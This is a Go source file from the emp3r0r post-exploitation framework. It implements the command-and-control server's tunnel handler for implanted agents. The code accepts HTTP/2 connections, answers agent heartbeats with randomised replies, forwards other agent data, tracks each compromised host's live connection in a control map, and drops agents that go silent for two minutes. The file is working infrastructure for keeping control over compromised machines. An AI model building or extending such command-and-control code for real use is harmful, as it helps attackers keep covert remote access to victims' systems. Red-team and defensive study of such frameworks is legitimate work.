package server

import (
	"context"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleMessageTunnel processes JSON C&C tunnel connections.
func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
	lastHandshake := time.Now()
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		logging.Errorf("handleMessageTunnel: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer func() {
		logging.Debugf("handleMessageTunnel exiting")
		for t, c := range live.AgentControlMap {
			if c.Conn == conn {
				live.AgentControlMapMutex.RLock()
				delete(live.AgentControlMap, t)
				live.AgentControlMapMutex.RUnlock()
				logging.Errorf("[%d] Agent dies", c.Index)
				logging.Printf("[%d] agent %s disconnected", c.Index, strconv.Quote(t.Tag))
				agents.ListConnectedAgents()
				break
			}
		}
		_ = conn.Close()
		cancel()
		logging.Debugf("handleMessageTunnel exited")
	}()
	in := json.NewDecoder(conn)
	out := json.NewEncoder(conn)
	var msg def.MsgTunData
	go func() {
		defer cancel()
		for ctx.Err() == nil {
			err = in.Decode(&msg)
			if err != nil {
				return
			}
			cmd := ""
			if len(msg.CmdSlice) != 0 {
				cmd = msg.CmdSlice[0]
			}
			if strings.HasPrefix(cmd, "hello") {
				reply := msg
				reply.CmdSlice = msg.CmdSlice
				reply.CmdID = msg.CmdID
				reply.Response = cmd + util.RandStr(util.RandInt(1, 10))
				err = out.Encode(reply)
				if err != nil {
					logging.Warningf("Failed to answer hello to agent %s", msg.Tag)
					return
				}
				lastHandshake = time.Now()
			} else {
				processAgentData(&msg)
			}
			agent := agents.GetAgentByTag(msg.Tag)
			if agent == nil {
				logging.Errorf("No agent found for message: %v", msg)
				return
			}
			shortname := agent.Name
			if live.AgentControlMap[agent].Conn == nil {
				logging.Successf("[%d] Knock.. Knock...", live.AgentControlMap[agent].Index)
				logging.Successf("agent %s connected", strconv.Quote(shortname))
			}
			live.AgentControlMap[agent].Conn = conn
			live.AgentControlMap[agent].Ctx = ctx
			live.AgentControlMap[agent].Cancel = cancel
		}
	}()
	for ctx.Err() == nil {
		if time.Since(lastHandshake) > 2*time.Minute {
			logging.Debugf("handleMessageTunnel: timeout for agent (%s)", msg.Tag)
			return
		}
		util.TakeABlink()
	}
}
